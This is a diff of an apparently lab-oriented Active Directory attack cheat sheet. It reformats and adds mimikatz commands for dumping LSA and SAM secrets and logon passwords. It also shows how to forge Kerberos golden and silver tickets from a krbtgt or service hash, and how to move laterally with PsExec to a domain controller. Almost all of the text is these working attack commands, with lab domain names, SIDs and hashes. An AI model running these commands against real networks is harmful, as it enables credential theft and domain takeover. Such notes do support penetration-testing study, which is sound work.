@@ -70,9 +70,10 @@ Privilege::debug
 lsadump::lsa /patch
 ```
 
-Now can create a Golden Ticket:
+Now we can create a Golden Ticket:
+```Kerberos::purge```
+
 ```
-Kerberos::purge
 kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
 2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
 ```
@@ -87,9 +88,10 @@ psexec.exe \\dc01 cmd.exe
 
 Get domain SID  - ```Whoami /user```
 
+```kerberos::list```
+
 ```
-kerberos::list
-mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
 ```
 
 #### MAINTENANCE
@@ -101,7 +103,9 @@ mimikatz # kerberos::list
 
 #### Invoke Mimikatz
 
-Invoke Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
+```Invoke Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'```
+
+```Invoke Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'```
 
 # Lateral Movement
 ```PsExec.exe -accepteula \\$HOSTNAME cmd```
